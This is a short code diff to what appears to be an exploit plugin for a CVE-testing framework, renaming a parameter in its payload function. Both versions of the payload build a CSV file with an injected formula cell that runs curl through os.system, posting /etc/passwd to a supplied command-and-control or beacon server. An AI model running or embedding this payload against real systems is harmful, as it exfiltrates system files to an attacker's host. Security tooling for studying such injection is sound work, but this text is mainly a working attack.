@@ -19,10 +19,10 @@ class CVE202627966Plugin(CVEPlugin):
             enabled=True,
         )
 
-    def craft_payload(self, c2_server: str, **kwargs) -> str:
+    def craft_payload(self, beacon_server: str, **kwargs) -> str:
         rows = [
             "name,age,secret",
             "Alice,30,normal",
-            f'Bob,25,"=1+1+os.system(\'curl {c2_server}/beacon -d "@/etc/passwd"\')"',
+            f'Bob,25,"=1+1+os.system(\'curl {beacon_server}/beacon -d "@/etc/passwd"\')"',
         ]
         return "\n".join(rows)
